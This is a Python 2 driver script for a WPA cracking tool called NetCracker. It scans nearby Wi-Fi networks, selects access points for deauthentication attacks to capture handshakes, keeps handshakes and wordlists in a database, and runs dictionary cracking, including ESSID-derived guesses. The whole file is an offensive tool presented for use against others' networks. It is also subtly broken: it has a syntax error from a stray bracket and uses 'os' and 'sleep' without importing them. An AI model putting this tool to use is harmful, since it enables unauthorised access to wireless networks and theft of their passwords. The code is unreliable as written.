#!/usr/bin/python
# coding:utf-8
from netcracker import *
from os import path, remove
from sys import stdout
from argparse import ArgumentParser

write = stdout.write
flush = stdout.flush


def program_header():
    print "|=============================================================|"
    print "|                         NetCracker                          |"
    print "|                  The best WPA cracking tool.                |"
    print "|                                                             |"
    print "| Date ......: 2016/06/24                                     |"
    print "| Version ...: 0.1.5                                          |"
    print "| Author ....: Shemhazai                                      |"
    print "|=============================================================|"
    return


def main():
    program_header()
    parser = ArgumentParser()

    general = parser.add_argument_group("general")
    scan = parser.add_argument_group("scan")
    crack = parser.add_argument_group("crack")
    wordlist = parser.add_argument_group("wordlist")

    # general
    general.add_argument("-l", "--list", help="List available data from database.")

    # Scan
    scan.add_argument("-i", "--interface", help="Interface to use.")
    scan.add_argument("-t", "--time", help="How much time of scanning before attack.")

    # Crack
    crack.add_argument("-f", "--file", help="PCAP File")
    crack.add_argument("--verify", help="Verify file for handshakes.", action="store_true")
    crack.add_argument("-c", "--crack", help="Crack a handshake.")
    crack.add_argument("-r", '--reset', help='Reset wordlist history from handshake.')

    # wordlist
    wordlist.add_argument('--remove', action='store_true', help="Remove password data SQL table.")
    wordlist.add_argument("--insert", action="store_true", help="Insert wordlist data into database.")
    wordlist.add_argument("--table", help="Table name to operate in this module.")
    wordlist.add_argument("-w", "--wordlist", help="Use a wordlist.")

    args = parser.parse_args()

    createMainFolder()  # create main folder
    db = accessDatabase()  # create db Object
    createTables(db)  # create data structure

    if args.list is not None:
        if str(args.list).lower() == "handshakes" or str(args.list).lower() == "handshake":
            data = getData(db, "HANDSHAKES")
            printMenu(data, 'handshakes', db)
            exit(0)
        elif str(args.list).lower() == "wordlists" or str(args.list).lower() == "wordlist":
            data = getData(db, "WORDLISTS")
            printMenu(data, 'wordlists', db)
            exit(0)
        else:
            print "The available options for listing are: 'handshakes' and 'wordlists'"
            exit(0)

    if args.remove is not False:
        if args.table is None:
            print "You need to point your data into a SQL table using --table argument."
            exit(0)
        removeTableProcedure(db, args.table)
        exit(0)

    if args.interface is not None:
        if args.time is not None:
            try:
                scn = Scanner(args.interface, int(args.time))
            except Exception as e:
                print "ERROR: %s" % (str(e))
        else:
            scn = Scanner(args.interface)

        aps, sts, pes = returnObjects(scn)  # retorna lista de APs, STs, e PES do objeto de scanner
        attackList = filterCandidatesWPACapture(aps)  # retorna os candidatos a ataque de deauth WPA
        printAvailableAPsToAttack(attackList)  # printa os candidatos
        dbData = queryProbedEssids(db)  # recolhe todos os PES do banco de dados
        probedProcedure(pes, db, dbData)  # insere os PES que ja nao estiverem relacionados no DB
        capturedAPs = getCapturedAPs(db)  # recolhe o BSSID de todos os handshakes ja capturados
        for ap in attackList:
            if ap.bssid in capturedAPs:  # If AP is in CAPTURED AP LIST
                printSkip(ap.essid, ap.bssid)  # PRINT the AP is going to be skipped
                continue  # SKIP THIS AP
            clientList = getClients(ap.bssid, sts)  # Recolhe todos os clientes com o mesmo BSSID do AP
            try:
                a = Attacker(db, args.interface, ap.essid, ap.bssid, ap.channel, clientList)  # ATACA O BSSID
            except KeyboardInterrupt:
                if attackList.index(ap) != len(attackList) - 1:
                    jumpNextTarget()
                else:
                    print "No more access points to launch attack."
                pass
        scn.setupInterfaceAfterScan()

    if args.file is not None:
        if path.isfile(args.file):
            c = Crack(args.file)
            if args.verify:
                status, essid, bssid = verify(c)
                if status == 0:
                    registerNewHandshake(db, path.abspath(args.file), (essid, bssid))
                exit(0)

            if args.insert:
                if args.table is None:
                    print "You need to point your data into a SQL table using --table argument."
                    exit(0)
                x = createWordlistTable(db, args.table)  # verifica ou cria a tabela fornecida pelo operador
                printSQLWordlistTableSituation(x, args.table)  # printa a situacao das tabelas
                data = parseWL(args.file)
                stored_words = gatherWords(db, args.table)
                stored_num = 0
                try:
                    while True:
                        word = data.next()
                        try:
                            if word.decode('utf-8') not in stored_words and "-" not in word:
                                if registerWord(db, str(word).replace("\n", ""), args.table) == 0:
                                    write(
                                        "[" + G + "!" + W + "] " + " ( %d ) New word stored in database: %s                    \r" % (
                                        stored_num, G + str(word).replace("\n", '') + W))
                                    stored_num += 1
                        except UnicodeDecodeError:
                            pass
                except StopIteration:
                    print "\n%d new words were inserted into database." % (stored_num)
                    db.handle.commit()

    if args.crack is not None:
        handshake_data = getData(db, "HANDSHAKES")
        wordlist_data = getData(db, "WORDLISTS")
        if len(wordlist_data) > 0 and len(handshake_data) > 0:
            wordlist_names = [x[1] for x in wordlist_data]
            wordlist_number = len(wordlist_names)
            if args.crack in [x[1] for x in handshake_data] or args.crack in [str(x[0]) for x in handshake_data]:
                try:
                    index = [x[1] for x in handshake_data].index(args.crack)
                except:
                    index = [str(x[0]) for x in handshake_data].index(args.crack)]

                uncrackedDir = "/usr/share/netcracker/handshakes/uncracked/"
                pcapFileName = str(handshake_data[index][3]).replace(" ", "")
                pcapPath = path.join(uncrackedDir, pcapFileName)

                passCracked = str(handshake_data[index][7])
                wls = str(handshake_data[index][6])
                essid = str(handshake_data[index][1])

                if args.reset is True:
                    resetWordlistHistory(db, handshake_data[index][2])
                    print "Handshake wordlist history set to blank state."
                    exit(0)

                if os.path.isfile(pcapPath):
                    print "\nTarget '%s#%d:%s%s' selected successfully." % (G, index, essid, W)
                    print BOLD + "\n______________\nTarget information:\n______________" + W
                    print BOLD + "ESSID .......:%s %s" % (W, essid)
                    print BOLD + "BSSID .......:%s %s" % (W, (handshake_data[index][2]))
                    print BOLD + "PATH ........:%s %s" % (W, path.basename(pcapPath))
                    print BOLD + "STATUS ......:%s %s" % (W, formatStatus(str(handshake_data[index][5])))
                    print BOLD + "WORDLISTS ...:%s %s" % (W, wls)
                    print BOLD + "PASSWORD ....:%s %s" % (W, passCracked)
                    if checkAlreadyCracked(passCracked) != 0:
                        print R + "Error: " + W + "You can not crack what is already cracked."
                        exit(0)
                else:
                    print R + "Could not find pcap file." + W
                # start cracking process
                runned = [str(x).replace(" ", "") for x in str(wls).split(",")]
                if "None" in runned:
                    runned.remove("None")

                if "CUSTOM" not in runned:
                    wordlist_names.insert(0, "CUSTOM")

                if len(runned) > 0:
                    print "\nPrevious wordlists runned in this pcap file: "
                    for x in xrange(len(runned)):
                        print " %s. " % (str(x + 1)) + G + "%s" % (runned[x]) + W
                if args.wordlist is not None:
                    if args.wordlist in wordlist_names:
                        wordlist_names = [args.wordlist]

                for wordlist in wordlist_names:
                    if wordlist not in runned:
                        if wordlist == "CUSTOM":
                            # custom procedure
                            data_holder = custom_procedure(essid)
                            if createWL(data_holder) != 0:
                                print R + "Error Creating Wordlist File." + W
                        else:
                            # data = gatherWords(db, wordlist)
                            if createWL(gatherWords(db, wordlist)) != 0:
                                print R + "Error creating wordlist file." + W
                        c = Crack(pcapPath)
                        if path.isfile("/tmp/netcracker_temporary_file"):
                            print "\nUsing wordlist table: %s" % (wordlist)
                            r = c.crackHandshake("/tmp/netcracker_temporary_file")
                            if r not in [0, -1]:
                                sleep(3)
                                remove("/tmp/netcracker_temporary_file")
                                insertNewRunnedWordlist(db, handshake_data[index][2], wordlist)
                                insertCrackedStatus(db, handshake_data[index][2], r)
                                break
                            sleep(3)
                            remove("/tmp/netcracker_temporary_file")
                        else:
                            print R + "Could not find temporary file containing passwords..." + W
                        print G + "Wordlist '%s' has finished. %sUpdating target information ..." % (wordlist, W)
                        insertNewRunnedWordlist(db, handshake_data[index][2], wordlist)
                    else:
                        print "\nIgnoring '%s%s%s' since it already was runned in this pcap file ..." % (G, wordlist, W)








            else:
                print "Handshake %snot found%s. %sPlease insert ESSID or Index (from listing option)%s" % (GR, W, G, W)

        else:
            print "%sError!%s Either you do not have any handshakes or any wordlists." % (R, W)
            exit(0)


if __name__ == "__main__":
    main()
